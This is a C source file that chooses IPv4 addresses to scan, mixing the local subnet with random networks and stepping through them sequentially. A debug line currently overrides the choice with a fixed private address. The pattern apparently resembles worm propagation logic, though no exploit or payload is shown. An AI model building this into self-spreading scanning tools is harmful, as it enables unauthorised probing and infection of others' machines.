#include "RandomChooseIP.h"
void RandomChooseIP(int ipAddress[]){
	int ClassD, ClassC, ClassB, ClassA;
	WSADATA WSAData;
	char myhostname[512];
	register unsigned long scan_local=0;
	scan_local = FALSE;
	if (WSAStartup(MAKEWORD(2,2), &WSAData) != 0 && WSAStartup(MAKEWORD(1,1), &WSAData) != 0 && WSAStartup(1, &WSAData) != 0)
		return;
	//Random ip for scaning
	ClassD = 0;
	srand(GetTickCount());
	//Gethost ip for scan in LAN
	if (gethostname(myhostname, sizeof(myhostname)) != -1) {
		HOSTENT *p_hostent = gethostbyname(myhostname);

		if (p_hostent != NULL && p_hostent->h_addr != NULL) {
			struct in_addr in;
			const char *p_addr_item;
			memcpy(&in, p_hostent->h_addr, sizeof(in));
			sprintf(myhostname, "%s", inet_ntoa(in));
			p_addr_item = strtok(myhostname, ".");
			
			ClassA = atoi(p_addr_item);
			p_addr_item = strtok(0, ".");
			
			ClassB = atoi(p_addr_item);
			p_addr_item = strtok(0, ".");
			
			ClassC = atoi(p_addr_item);

			scan_local = TRUE;

		}
	}
	srand(GetTickCount());
	if ((rand() % 20) < 12)
		scan_local = FALSE;
	if (!scan_local) {
		ClassA = (rand() % 254)+1;
		ClassB = (rand() % 254);
		ClassC = (rand() % 254);
	}
	/*ipAddress[0] = ClassA;
	ipAddress[1] = ClassB;
	ipAddress[2] = ClassC;
	ipAddress[3] = ClassD;
	*///for debug
	ipAddress[0] = 192;
	ipAddress[1] = 168;
	ipAddress[2] = 213;
	ipAddress[3] = 1;
} 
void RandomChooseIP_IncreaseIP(int ipAddress[]){
	for (;;) {
		if (ipAddress[3] <= 254) {
			ipAddress[3]++;
			return;
		}
	ipAddress[3] = 0;
	ipAddress[2]++;
	if (ipAddress[2] <= 254)
	return;
	ipAddress[2] = 0;
	ipAddress[1]++;
	if (ipAddress[1] <= 254)
	return;
	ipAddress[1] = 0;
	ipAddress[0]++;
	if (ipAddress[0] <= 254)
	continue;
	ipAddress[0] = 0;
	return;
	}
}


